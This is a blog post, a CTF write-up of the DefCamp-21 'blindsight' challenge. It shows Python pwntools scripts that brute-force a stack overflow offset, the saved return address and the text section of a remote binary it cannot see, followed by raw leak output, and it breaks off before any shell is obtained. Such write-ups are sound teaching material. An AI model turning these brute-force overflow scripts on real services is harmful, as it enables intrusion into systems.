<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="DefCamp-21 Blindsight Writeup" /><meta property="og:locale" content="en" /><meta name="description" content="A Blog of a Cyber Sec Enthusiast Interested in Binary Exploitation Part of IIT(BHU)CyberSec Interested in Operating Systems, Full Stack Development, Playing CTF’s and Computers in general" /><meta property="og:description" content="A Blog of a Cyber Sec Enthusiast Interested in Binary Exploitation Part of IIT(BHU)CyberSec Interested in Operating Systems, Full Stack Development, Playing CTF’s and Computers in general" /><link rel="canonical" href="/posts/DefCamp-21-Blindsight/" /><meta property="og:url" content="/posts/DefCamp-21-Blindsight/" /><meta property="og:site_name" content="EsharkyTheGreat’s Personal Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-02-14T16:17:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="DefCamp-21 Blindsight Writeup" /><meta name="twitter:site" content="@eshwars1210" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"dateModified":"2022-02-14T17:34:20+05:30","datePublished":"2022-02-14T16:17:00+05:30","description":"A Blog of a Cyber Sec Enthusiast Interested in Binary Exploitation Part of IIT(BHU)CyberSec Interested in Operating Systems, Full Stack Development, Playing CTF’s and Computers in general","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/DefCamp-21-Blindsight/"},"url":"/posts/DefCamp-21-Blindsight/","@type":"BlogPosting","headline":"DefCamp-21 Blindsight Writeup","@context":"https://schema.org"}</script><title>DefCamp-21 Blindsight Writeup | EsharkyTheGreat's Personal Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="EsharkyTheGreat's Personal Blog"><meta name="application-name" content="EsharkyTheGreat's Personal Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/uchihaSasuke.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">EsharkyTheGreat's Personal Blog</a></div><div class="site-subtitle font-italic">Cyber Sec Enthusiast | Binary Exploitation | IIT(BHU)'24 | CTF w/ IIT(BHU)CyberSec'</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/EsharkyTheGreat" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/eshwars1210" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['eshwars1210','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>DefCamp-21 Blindsight Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>DefCamp-21 Blindsight Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> EsharkyTheGreat </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Feb 14, 2022, 4:17 PM +0530" >Feb 14<i class="unloaded">2022-02-14T16:17:00+05:30</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Feb 14, 2022, 5:34 PM +0530" >Feb 14<i class="unloaded">2022-02-14T17:34:20+05:30</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3820 words">21 min read</span></div></div><div class="post-content"><p><img data-proofer-ignore data-src="/assets/postimg/defcamp-21-blindsight/chall_desc.png" alt="Chall_Desc" /></p><h2 id="challenge-overview">Challenge Overview</h2><hr /><p>This is a writeup of the <code class="language-plaintext highlighter-rouge">blindsight</code> challenge from DefCamp-21. The challenge only provides us with a <code class="language-plaintext highlighter-rouge">libc.so</code> file and the <code class="language-plaintext highlighter-rouge">ip</code> and <code class="language-plaintext highlighter-rouge">port</code> of a server. We need to find a way to connect to the server and get a shell without the binary running on it</p><p><img data-proofer-ignore data-src="/assets/postimg/defcamp-21-blindsight/chall_files.png" alt="Chall_files" /></p><h2 id="recon">Recon</h2><hr /><p>We can connect to the server using the netcat command</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc &lt;ip&gt; &lt;port&gt;
</pre></table></code></div></div><p>We see that when we provide input of small size we get a response message but when the message exceeds a certain length we dont get that message, this could mean that we overwrote the <code class="language-plaintext highlighter-rouge">RIP</code></p><h2 id="get-rip-offset">Get RIP Offset</h2><hr /><p>At first I thought there could be a <code class="language-plaintext highlighter-rouge">stack canary</code> but to brute force that canary the server would have to fork or make threads so that the canary remains same between connections. So since there is no canary I started bruteforcing the <code class="language-plaintext highlighter-rouge">offset</code> at which the RIP is stored from our input using the function below.</p><div class="language-py highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">pwn</span>
<span class="c1"># Global Variables
</span><span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">ELF</span><span class="p">(</span><span class="s">"libc-2.23.so"</span><span class="p">)</span>
<span class="n">HOST</span> <span class="o">=</span> <span class="s">"34.159.129.6"</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">30550</span>

<span class="k">def</span> <span class="nf">GetRipOffset</span><span class="p">():</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s">'critical'</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">offset</span>
        <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">mssg</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">()</span>
        <span class="k">if</span> <span class="sa">b</span><span class="s">'No password'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">mssg</span><span class="p">:</span>
            <span class="k">break</span>
        <span class="n">offset</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">offset</span><span class="o">-</span><span class="mi">1</span>
</pre></table></code></div></div><p>We get the offset as 88 so we make that as a global variable to help us in the future.</p><div class="language-py highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">OFFSET</span> <span class="o">=</span> <span class="mi">88</span>
</pre></table></code></div></div><h2 id="bruteforcing-the-rip">Bruteforcing the RIP</h2><hr /><p>Since we got the offset we can bruteforce the RIP by bruteforcing the offset from the input. The way we bruteforce it is we bruteforce the bytes at which the return message is printed</p><div class="language-py highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">BruteRip</span><span class="p">():</span>
    <span class="n">rip</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
            <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s">'critical'</span><span class="p">)</span>
            <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="n">rip</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p8</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
            <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
            <span class="n">mssg</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
            <span class="k">if</span> <span class="sa">b</span><span class="s">'No password'</span> <span class="ow">in</span> <span class="n">mssg</span><span class="p">:</span>
                <span class="n">rip</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p8</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
                <span class="n">pwn</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"RIP: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">pwn</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">rip</span><span class="p">,</span> <span class="s">'all'</span><span class="p">)))</span>
                <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
                <span class="k">break</span>
            <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">rip</span>
</pre></table></code></div></div><p>With this script we get -</p><div class="language-py highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">RIP</span> <span class="o">=</span> <span class="mh">0x40070a</span>
</pre></table></code></div></div><p>Keep in mind that this may not be the exact address of the function that prints the message <code class="language-plaintext highlighter-rouge">No password for you</code> but it is close to it.<br /> From the <code class="language-plaintext highlighter-rouge">RIP</code> we can also infer that it is <code class="language-plaintext highlighter-rouge">x64</code> executable with <code class="language-plaintext highlighter-rouge">PIE</code> enabled as its <code class="language-plaintext highlighter-rouge">text</code> section is mapped at address starting from <code class="language-plaintext highlighter-rouge">0x400000</code>. We add 2 more global variables -</p><div class="language-py highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">BINARY_BASE</span> <span class="o">=</span> <span class="mh">0x400000</span>
<span class="n">RIP</span> <span class="o">=</span> <span class="mh">0x40070a</span>
</pre></table></code></div></div><h2 id="scan-text-section">Scan Text section</h2><hr /><p>Since we know the start of the <code class="language-plaintext highlighter-rouge">.text</code> section we can scan the text section for the functions present in it and the output they give. I used the following function -</p><div class="language-py highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">ScanText</span><span class="p">():</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">):</span>
        <span class="n">pwn</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Scanning: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">BINARY_BASE</span> <span class="o">+</span> <span class="n">i</span><span class="p">))</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s">'critical'</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">BINARY_BASE</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">mssg</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">mssg</span> <span class="o">!=</span> <span class="sa">b</span><span class="s">'Are you blind my friend?</span><span class="se">\n</span><span class="s">'</span> <span class="ow">and</span> <span class="n">mssg</span> <span class="o">!=</span> <span class="sa">b</span><span class="s">'Are you blind my friend?'</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"Offset"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="s">"Addr"</span><span class="p">,</span> <span class="n">BINARY_BASE</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">mssg</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></table></code></div></div><p>The output that we get is -</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre>Offset 1365 Addr 4195669 b<span class="s1">'Are you blind my friend?\n\x9ac&amp;\x06P\x7f\x00\x00AAAAAAAAF\x00\x00\x00\x00\x00\x00\x00 &amp;[\x06P\x7f\x00\x00\xf0W6\xd2\xff\x7f\x00\x000Y6\xd2\xff\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00H\xc7%\x06P\x7f\n'</span>
Offset 1367 Addr 4195671 b<span class="s2">"Are you blind my friend?</span><span class="se">\n\x</span><span class="s2">9a</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">c5</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00AAAAAAAAF</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00 </span><span class="se">\x</span><span class="s2">86</span><span class="se">\x</span><span class="s2">fa</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">d0</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\x</span><span class="s2">bf</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">ed</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\x</span><span class="s2">bf</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00H'</span><span class="se">\x</span><span class="s2">c5</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\n</span><span class="s2">"</span>
Offset 1372 Addr 4195676 b<span class="s1">'Are you blind my friend?\n\x9asu\x00\xb5\x7f\x00\x00AAAAAAAAC\x00\x00\x00\x00\x00\x00\x00 6\xaa\x00\xb5\x7f\x00\x00P\x9b=i\xfd\x7f\x00\x00\x90\x9c=i\xfd\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00H\xd7t\n'</span>
Offset 1374 Addr 4195678 b<span class="s1">'Are you blind my friend?\n\n'</span>
Offset 1376 Addr 4195680 b<span class="s1">'Are you blind my friend?\n\x9a\xe3\xa1\xac8\x7f\x00\x00AAAAAAAAF\x00\x00\x00\x00\x00\x00\x00 \xa6\xd6\xac8\x7f\x00\x00@\xdd\xc7f\xfe\x7f\x00\x00\x80\xde\xc7f\xfe\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00HG\xa1\xac8\x7f\n'</span>
Offset 1377 Addr 4195681 b<span class="s1">'Are you blind my friend?\n\n'</span>
Offset 1382 Addr 4195686 b<span class="s1">'Are you blind my friend?\n\n'</span>
Offset 1472 Addr 4195776 b<span class="s1">'Are you blind my friend?\nAre you blind my friend?\n'</span>
Offset 1474 Addr 4195778 b<span class="s1">'Are you blind my friend?\nAre you blind my friend?\n'</span>
Offset 1475 Addr 4195779 b<span class="s1">'Are you blind my friend?\nAre you blind my friend?\n'</span>
Offset 1477 Addr 4195781 b<span class="s1">'Are you blind my friend?\nAre you blind my friend?\n'</span>
Offset 1478 Addr 4195782 b<span class="s1">'Are you blind my friend?\nAre you blind my friend?\n'</span>
Offset 1479 Addr 4195783 b<span class="s1">'Are you blind my friend?\nAre you blind my friend?'</span>
Offset 1481 Addr 4195785 b<span class="s1">'Are you blind my friend?\nAre you blind my friend?\n'</span>
Offset 1485 Addr 4195789 b<span class="s1">'Are you blind my friend?\nAre you blind my friend?\n'</span>
Offset 1486 Addr 4195790 b<span class="s1">'Are you blind my friend?\nAre you blind my friend?\n'</span>
Offset 1487 Addr 4195791 b<span class="s1">'Are you blind my friend?\nAre you blind my friend?\n'</span>
Offset 1488 Addr 4195792 b<span class="s1">'Are you blind my friend?\nAre you blind my friend?\n'</span>
Offset 1494 Addr 4195798 b<span class="s1">'Are you blind my friend?\nAre you blind my friend?\n'</span>
Offset 1495 Addr 4195799 b<span class="s1">'Are you blind my friend?\nAre you blind my friend?\n'</span>
Offset 1501 Addr 4195805 b<span class="s1">'Are you blind my friend?\nAre you blind my friend?\n'</span>
Offset 1502 Addr 4195806 b<span class="s1">'Are you blind my friend?\nAre you blind my friend?\n'</span>
Offset 1718 Addr 4196022 b<span class="s1">'Are you blind my friend?\nAre you blind my friend?\n'</span>
Offset 1719 Addr 4196023 b<span class="s1">'Are you blind my friend?\nAre you blind my friend?\n'</span>
Offset 1720 Addr 4196024 b<span class="s1">'Are you blind my friend?\nAre you blind my friend?\n'</span>
Offset 1722 Addr 4196026 b<span class="s1">'Are you blind my friend?\nAre you blind my friend?\n'</span>
Offset 1762 Addr 4196066 b<span class="s1">'Are you blind my friend?\nAre you blind my friend?\n'</span>
Offset 1782 Addr 4196086 b<span class="s1">'Are you blind my friend?\nAre you blind my friend?'</span>
Offset 1787 Addr 4196091 b<span class="s1">'Are you blind my friend?\nAAAAAAAA&gt;\x00\x00\x00\x00\x00\x00\x00 V\xd2xK\x7f\x00\x00 \xa2@&amp;\xfe\x7f\x00\x00`\xa3@&amp;\xfe\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00H\xf7\x9cxK\x7f\n'</span>
Offset 1802 Addr 4196106 b<span class="s1">'Are you blind my friend?\nNo password for you!\n'</span>
Offset 1804 Addr 4196108 b<span class="s1">'Are you blind my friend?\nNo password for you!\n'</span>
Offset 1806 Addr 4196110 b<span class="s1">'Are you blind my friend?\nDo not dump my memory!\n'</span>
Offset 1811 Addr 4196115 b<span class="s1">'Are you blind my friend?\nAAAAAAAA&gt;\x00\x00\x00\x00\x00\x00\x00 \x96\xfc\xb8\xac\x7f\x00\x00`\xa7 z\xfe\x7f\x00\x00\xa0\xa8 z\xfe\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00H7\xc7\xb8\xac\x7f\n'</span>
Offset 1818 Addr 4196122 b<span class="s1">'Are you blind my friend?\nNo password for you!\n'</span>
Offset 1823 Addr 4196127 b<span class="s1">'Are you blind my friend?\nAAAAAAAA&gt;\x00\x00\x00\x00\x00\x00\x00 6G\xea\xc2\x7f\x00\x00\x00[\xf0\xfc\xfc\x7f\x00\x00@\\\xf0\xfc\xfc\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00H\xd7\x11\xea\xc2\x7f\n'</span>
